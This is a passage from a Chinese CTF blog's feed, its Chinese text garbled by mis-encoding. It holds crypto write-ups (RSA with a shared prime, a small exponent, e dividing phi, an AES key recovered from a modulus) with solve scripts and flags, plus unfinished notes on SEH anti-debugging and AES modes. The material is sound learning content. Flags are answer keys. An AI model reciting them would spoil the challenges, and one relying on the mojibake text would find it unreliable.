<span class="built_in">print</span>(<span class="string">&#x27;æ˜æ–‡æ˜¯ï¼š&#x27;</span>, decrypted_text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># å¦‚æœè§£å¯†å¤±è´¥ï¼Œå°±å°è¯•ä¸‹ä¸€ä¸ªå¯†é’¥</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>CRYPTO</h1><p>å…ˆä»ç®€å•çš„ç»ƒèµ·å§ã€‚</p><h2 id="bigRSA">bigRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br></pre></td></tr></table></figure><p>å®ƒç”¨äº†ä¸¤ä¸ªnï¼Œå°è¯•è«ä¸äº’ç´ ï¼šgcdä¸€ä¸‹ï¼Œå‡ºæ¥äº†æœ€å¤§å…¬å€æ•°ï¼Œé‚£å°±ç›´æ¥è§£äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a = GCD(n1,n2)</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line">n1_ = n1 //a</span><br><span class="line">n2_ = n2 // a</span><br><span class="line"><span class="comment"># print(n1_)</span></span><br><span class="line"><span class="comment"># print(n2_)</span></span><br><span class="line"></span><br><span class="line">d1 = <span class="built_in">pow</span>(e,-<span class="number">1</span>,(a-<span class="number">1</span>)*(n2_-<span class="number">1</span>))</span><br><span class="line">c1 = <span class="built_in">pow</span>(c,d1,n2)</span><br><span class="line">d2 = <span class="built_in">pow</span>(e,-<span class="number">1</span>,(a-<span class="number">1</span>)*(n1_-<span class="number">1</span>))</span><br><span class="line">c2 = <span class="built_in">pow</span>(c1,d2,n1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c2))</span><br><span class="line"><span class="comment"># b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="bad-e">bad_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p) <span class="comment"># 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span></span><br><span class="line"><span class="built_in">print</span>(q) <span class="comment"># 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,p*q)</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span></span><br></pre></td></tr></table></figure><p>å·²çŸ¥pï¼Œqï¼Œeï¼Œcï¼Œç›´æ¥è§£</p><p>6,è§£ä¸å‡ºæ¥ï¼Œè¯´æ˜¯eæ˜¯phiçš„å› å­ï¼Œä¸èƒ½å¾—å‡ºmï¼Œé‚£å°±åˆ†è§£ä¸€ä¸‹phi</p><p>å‘ç°p-1æ˜¯eçš„å€æ•°ï¼Œä½†æ˜¯q-1ä¸æ˜¯ï¼Œæ ¹æ®åŒä½™çš„æ¶ˆå»å¾‹å¯æ¶ˆå»ä¸¤è¾¹çš„æœ€å¤§å…¬å› æ•°</p><p>ç›¸å½“äºmod((q-1)),å°±å‡ºæ¥äº†</p><h2 id="baby-e">baby_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"></span><br><span class="line">p,q = getPrime(<span class="number">2048</span>),getPrime(<span class="number">2048</span>)</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().strip())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c =  147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span></span><br><span class="line"><span class="comment"># n =  553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span></span><br></pre></td></tr></table></figure><p>eå¾ˆå°</p><p>$c = m^e + kn$</p><p>$m = (c - kn)**(1/7)$</p><p>å°è¯•ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>]))) <span class="comment">#è½¬ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k=k+<span class="number">1</span></span><br><span class="line">    <span class="comment"># b&#x27;moectf&#123;SMaLL_3xPon3nt_Mak3_rSa_w3ak!_!lP0iYlJf!M3rux9G9Vf!JoxiMl903lllA&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ç‹‚é£™">ç‹‚é£™</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">flag = <span class="string">b&#x27;19209389120572313&#x27;</span></span><br><span class="line">m = <span class="number">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></span><br><span class="line">key = os.urandom(<span class="number">24</span>)</span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">n=m % key</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc_flag = aes.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#103560843006078708944833658339172896192389513625588</span></span><br><span class="line"><span class="comment">#b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡n = m % keyæ¥æ±‚key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„å€¼</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„å› å­</span></span><br><span class="line">factors = [<span class="number">3</span>,<span class="number">37</span>,<span class="number">439</span>,<span class="number">3939851</span>, <span class="number">265898280367</span>,<span class="number">5036645362649</span>,<span class="number">342291058100503482469327892079792475478873</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰å¯èƒ½çš„ç»„åˆ</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(factors) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> combinations(factors, r):</span><br><span class="line">        <span class="comment"># è®¡ç®—å¯èƒ½çš„ key</span></span><br><span class="line">        possible_key = reduce(<span class="keyword">lambda</span> x, y: x*y, subset)</span><br><span class="line">        <span class="comment"># æ£€æŸ¥ key çš„é•¿åº¦æ˜¯å¦ä¸º 24 å­—èŠ‚</span></span><br><span class="line">        <span class="comment"># ä½¿ç”¨æ‰¾åˆ°çš„ keyã€iv å’Œ enc_flag è§£å¯† flag</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            aes = AES.new(long_to_bytes(possible_key), AES.MODE_CBC, iv)</span><br><span class="line">            flag = aes.decrypt(enc_flag)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Found possible flag:&#x27;</span>, flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ‚é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>REä¸­çš„åè°ƒè¯•</title>
      <link href="/posts/2af5212f.html"/>
      <url>/posts/2af5212f.html</url>
      
        <content type="html"><![CDATA[<h2 id="SEH">SEH</h2><p>åœ¨pythonä¸­ï¼Œä½ æ˜¯å¦è§è¿‡ä»¥ä¸‹è¯­æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(factors) + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> subset <span class="keyword">in</span> combinations(factors, r):</span><br><span class="line">        possible_key = reduce(<span class="keyword">lambda</span> x, y: x*y, subset)</span><br><span class="line">        <span class="keyword">try</span>:<span class="comment">#é˜²æ­¢keyçš„é•¿åº¦ä¸å¯¹</span></span><br><span class="line">            aes = AES.new(long_to_bytes(possible_key), AES.MODE_CBC, iv)</span><br><span class="line">            flag = aes.decrypt(enc_flag)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found possible flag:&#x27;</span>, flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>å³</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line"><span class="keyword">except</span></span><br></pre></td></tr></table></figure><p>å®ƒçš„ä½œç”¨æ˜¯å°è¯•æ‰§è¡Œtryå—ä¸­çš„å†…å®¹ï¼Œå¦‚æœå‡ºç°å¼‚å¸¸ï¼Œå°±æ‰§è¡Œexceptçš„å†…å®¹ã€‚</p><p>åœ¨Windowsä¸­ï¼Œä¹Ÿæœ‰ç±»ä¼¼çš„ä¿æŠ¤ç¨‹åºæ­£å¸¸æ‰§è¡Œçš„æœºåˆ¶ï¼Œå«åšSEHï¼ˆStructured Exception Handlingï¼‰</p><p>é€šè¿‡åœ¨æºä»£ç ä½¿ç”¨__try,__except,__finallyæ¥å®ç°</p><p>ä½¿ç”¨æ—¶ï¼Œexcept()ä¸­çš„å€¼ç”¨æ¥è¡¨ç¤ºå¼‚å¸¸å¤„ç†æ–¹æ³•</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">__except()æ‹¬å·ä¸­è¡¨è¾¾å¼çš„å–å€¼èŒƒå›´:</span></span><br><span class="line"><span class="section">1:å¤„ç†å¼‚å¸¸</span></span><br><span class="line"><span class="section">0:ä¸å¤„ç†å¼‚å¸¸äº¤ç»™ä¸‹ä¸€ä¸ªå¼‚å¸¸èŠ‚ç‚¹å»å¤„ç†</span></span><br><span class="line"><span class="section">-1:ç»§ç»­æ‰§è¡Œï¼ˆç¨‹åºç›´æ¥å¯„æ‰ï¼‰</span></span><br></pre></td></tr></table></figure><p>åœ¨ç¨‹åºä¸­ï¼Œå¯èƒ½æ•…æ„ä½¿ç”¨SEHï¼Œåˆ»æ„å¼•å‘é”™è¯¯è·³è¿‡æ‰§è¡Œä¸€äº›æŒ‡ä»¤</p><hr><p>æ–½å·¥ä¸­</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> åŠ¨è°ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ å¯†03:AES</title>
      <link href="/posts/ca6bad6.html"/>
      <url>/posts/ca6bad6.html</url>
      
        <content type="html"><![CDATA[<h1>Advanced Encryption Standard</h1><p>(é«˜çº§åŠ å¯†æ ‡å‡†)</p><h2 id="æ€§è´¨">æ€§è´¨</h2><p>å¯¹ç§°åŠ å¯†ï¼Œå—åŠ å¯†ï¼ŒæµåŠ å¯†<br>å¯†é’¥é•¿åº¦å›ºå®šä¸ºï¼š128ï¼Œ192ï¼Œ256bit<br>åŠ å¯†æ¨¡å¼åˆ†ä¸ºï¼šCBC,CFB,OFB,CTR,GCM,ECB</p><ul><li>å¯¹ç§°åŠ å¯†ï¼šåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ç›¸åŒ</li></ul><blockquote><h2 id="åˆ†ç»„å¯†ç å’Œæµå¯†ç ">åˆ†ç»„å¯†ç å’Œæµå¯†ç </h2><p>åˆ†ç»„å¯†ç æ˜¯æ¯æ¬¡åªèƒ½å¤„ç†ç‰¹å®šé•¿åº¦çš„ä¸€å—æ•°æ®çš„ä¸€ç±»å¯†ç ç®—æ³•ï¼Œè¿™é‡Œçš„â€œä¸€å—â€å°±ç§°ä¸ºåˆ†ç»„ã€‚ä¸€ä¸ªåˆ†ç»„çš„æ¯”ç‰¹æ•°å°±ç§°ä¸ºåˆ†ç»„é•¿åº¦ã€‚<br>æµå¯†ç æ˜¯å¯¹æ•°æ®æµè¿›è¡Œè¿ç»­å¤„ç†çš„ä¸€ç±»å¯†ç ç®—æ³•ã€‚æµå¯†ç ä¸€èˆ¬ä»¥1æ¯”ç‰¹ã€8æ¯”ç‰¹æˆ–32æ¯”ç‰¹ç­‰ä¸ºå•ä½è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚<br>åˆ†ç»„å¯†ç ç®—æ³•åªèƒ½åŠ å¯†å›ºå®šé•¿åº¦çš„åˆ†ç»„ï¼Œä½†éœ€è¦åŠ å¯†çš„æ˜æ–‡é•¿åº¦å¯èƒ½ä¼šè¶…è¿‡åˆ†ç»„å¯†ç çš„åˆ†ç»„é•¿åº¦ï¼Œè¿™å°±éœ€è¦å¯¹åˆ†ç»„å¯†ç ç®—æ³•è¿›è¡Œè¿­ä»£ï¼Œä»¥ä¾¿å°†ä¸€æ®µå¾ˆé•¿çš„æ˜æ–‡å…¨éƒ¨åŠ å¯†ã€‚è¿­ä»£çš„æ–¹æ³•å°±è¢«ç§°ä¸ºåˆ†ç»„å¯†ç çš„æ¨¡å¼ã€‚</p></blockquote><blockquote><ul><li>ECBæ¨¡å¼ï¼šElectronic CodeBook modeï¼ˆç”µå­å¯†ç æœ¬æ¨¡å¼ï¼‰</li><li>CBCæ¨¡å¼ï¼šCipher Block Chaining modeï¼ˆå¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ï¼‰</li><li>CFBæ¨¡å¼ï¼šCipher FeedBack modeï¼ˆå¯†æ–‡åé¦ˆæ¨¡å¼ï¼‰</li><li>OFBæ¨¡å¼ï¼šOutput FeedBack modeï¼ˆè¾“å‡ºåé¦ˆæ¨¡å¼ï¼‰</li><li>CTRæ¨¡å¼ï¼šCounTeR modeï¼ˆè®¡æ•°å™¨æ¨¡å¼ï¼‰</li></ul></blockquote><table><thead><tr><th>æ¨¡å¼</th><th>åç§°</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>ECBæ¨¡å¼</td><td>Electronic CodeBook modeï¼ˆç”µå­å¯†ç æœ¬æ¨¡å¼ï¼‰</td><td>ç®€å•ã€å¿«é€Ÿã€æ”¯æŒå¹¶è¡Œè¿ç®—ï¼ˆåŠ å¯†ã€è§£å¯†ï¼‰</td><td>æ˜æ–‡ä¸­çš„é‡å¤æ’åˆ—ä¼šåæ˜ åœ¨å¯†æ–‡ä¸­ï¼›é€šè¿‡åˆ é™¤ã€æ›¿æ¢å¯†æ–‡åˆ†ç»„å¯ä»¥å¯¹æ˜æ–‡è¿›è¡Œæ“ä½œï¼›å¯¹åŒ…å«æŸäº›æ¯”ç‰¹é”™è¯¯çš„å¯†æ–‡è¿›è¡Œè§£å¯†æ—¶ï¼Œå¯¹åº”çš„åˆ†ç»„ä¼šå‡ºé”™ï¼›ä¸èƒ½ä½äºé‡æ”¾æ”»å‡»ã€‚</td><td>ä¸åº”ä½¿ç”¨</td></tr><tr><td>CBCæ¨¡å¼</td><td>Cipher Block Chaining modeï¼ˆå¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ï¼‰</td><td>æ˜æ–‡çš„é‡å¤æ’åˆ—ä¸ä¼šåæ˜ åœ¨å¯†æ–‡ä¸­ï¼›æ”¯æŒå¹¶è¡Œè®¡ç®—ï¼ˆä»…è§£å¯†ï¼‰ï¼›èƒ½å¤Ÿè§£å¯†ä»»ä½•å¯†æ–‡åˆ†ç»„</td><td>å¯¹åŒ…å«æŸäº›é”™è¯¯æ¯”ç‰¹çš„å¯†æ–‡è¿›è¡Œè§£å¯†æ—¶ï¼Œç¬¬ä¸€ä¸ªåˆ†ç»„çš„å…¨éƒ¨æ¯”ç‰¹ä»¥åŠåä¸€ä¸ªåˆ†ç»„çš„ç›¸åº”æ¯”ç‰¹ä¼šå‡ºé”™ï¼›åŠ å¯†ä¸æ”¯æŒå¹¶è¡Œè®¡ç®—</td><td>CRYPTRECæ¨èï¼›ã€Šå®ç”¨å¯†ç å­¦ã€‹æ¨è</td></tr><tr><td>CFBæ¨¡å¼</td><td>Cipher FeedBack modeï¼ˆå¯†æ–‡åé¦ˆæ¨¡å¼ï¼‰</td><td>ä¸éœ€è¦å¡«å……ï¼ˆpaddingï¼‰ï¼›æ”¯æŒå¹¶è¡Œè®¡ç®—ï¼ˆä»…è§£å¯†ï¼‰ï¼›èƒ½å¤Ÿè§£å¯†ä»»æ„å¯†æ–‡åˆ†ç»„</td><td>åŠ å¯†ä¸æ”¯æŒå¹¶è¡Œè®¡ç®—ï¼›å¯¹åŒ…å«æŸäº›é”™è¯¯æ¯”ç‰¹çš„å¯†æ–‡è¿›è¡Œè§£å¯†æ—¶ï¼Œç¬¬ä¸€ä¸ªåˆ†ç»„çš„å…¨éƒ¨æ¯”ç‰¹ä»¥åŠåä¸€ä¸ªåˆ†ç»„çš„ç›¸åº”æ¯”ç‰¹ä¼šå‡ºé”™ï¼›ä¸èƒ½ä½äºé‡æ”¾æ”»å‡»</td><td>CRYPTRECæ¨è</td></tr><tr><td>OFBæ¨¡å¼</td><td>Output FeedBack modeï¼ˆè¾“å‡ºåé¦ˆæ¨¡å¼ï¼‰</td><td>ä¸éœ€è¦å¡«å……ï¼ˆpaddingï¼‰ï¼›å¯å®ç°è¿›è¡ŒåŠ å¯†ã€è§£å¯†çš„å‡†å¤‡ï¼›è§£å¯†è§£å¯†ä½¿ç”¨ç›¸åŒç»“æ„ï¼›å¯¹åŒ…å«æŸäº›é”™è¯¯æ¯”ç‰¹å¯†æ–‡è§£å¯†æ—¶ï¼Œåªæœ‰æ˜æ–‡ä¸­ç›¸åº”çš„æ¯”ç‰¹ä¼šå‡ºé”™</td><td>ä¸æ”¯æŒå¹¶è¡Œè®¡ç®—ï¼›ä¸»åŠ¨æ”»å‡»è€…åè½¬å¯†æ–‡åˆ†ç»„ä¸­çš„æŸäº›æ¯”ç‰¹æ—¶ï¼Œæ˜æ–‡åˆ†ç»„ä¸­ç›¸åº”çš„æ¯”ç‰¹ä¹Ÿä¼šè¢«åè½¬</td><td>CRYPTRECæ¨è</td></tr><tr><td>CTRæ¨¡å¼</td><td>CounTeR modeï¼ˆè®¡æ•°å™¨æ¨¡å¼ï¼‰</td><td>ä¸éœ€è¦å¡«å……ï¼ˆpaddingï¼‰ï¼›å¯å®ç°è¿›è¡ŒåŠ å¯†ã€è§£å¯†çš„å‡†å¤‡ï¼›è§£å¯†è§£å¯†ä½¿ç”¨ç›¸åŒç»“æ„ï¼›å¯¹åŒ…å«æŸäº›é”™è¯¯æ¯”ç‰¹å¯†æ–‡è§£å¯†æ—¶ï¼Œåªæœ‰æ˜æ–‡ä¸­ç›¸åº”çš„æ¯”ç‰¹ä¼šå‡ºé”™ï¼›æ”¯æŒå¹¶è¡Œè®¡ç®—ï¼ˆåŠ å¯†ã€è§£å¯†)</td><td>ä¸»åŠ¨æ”»å‡»è€…åè½¬å¯†æ–‡åˆ†ç»„ä¸­çš„æŸäº›æ¯”ç‰¹æ—¶ï¼Œæ˜æ–‡åˆ†ç»„ä¸­ç›¸åº”çš„æ¯”ç‰¹ä¹Ÿä¼šè¢«åè½¬</td><td>CRYPTRECæ¨èï¼›ã€Šå®ç”¨å¯†ç å­¦ã€‹æ¨è</td></tr></tbody></table><p>ä»¥ä¸Šå†…å®¹æ¥è‡ª(<a href="https://blog.csdn.net/weixin_43946212/article/details/108116251">åˆ†ç»„å¯†ç çš„æ¨¡å¼â€”â€”ECBã€CBCã€CFBã€OFBã€CTR_ofbæ˜¯æŒ‡åˆ†ç»„å¯†ç çš„å“ªç§å·¥ä½œæ¨¡å¼-CSDNåšå®¢</a>)</p><hr><h2 id="è¿‡ç¨‹">è¿‡ç¨‹</h2><h3 id="æ˜æ–‡åˆ†å—">æ˜æ–‡åˆ†å—</h3><p>æŠŠæ‰€æœ‰æ˜æ–‡åˆ†ä¸ºnå—ï¼Œæ¯å—128bitã€‚å¦‚æœæœ€åä¸è¶³ï¼Œéœ€è¦å¡«å……ï¼š</p><ul><li><code>NoPadding</code>ï¼š ä¸åšä»»ä½•å¡«å……ï¼Œä½†æ˜¯è¦æ±‚æ˜æ–‡å¿…é¡»æ˜¯16å­—èŠ‚çš„æ•´æ•°å€ã€‚<br><code>PKCS5Padding</code>ï¼ˆé»˜è®¤ï¼‰ï¼š 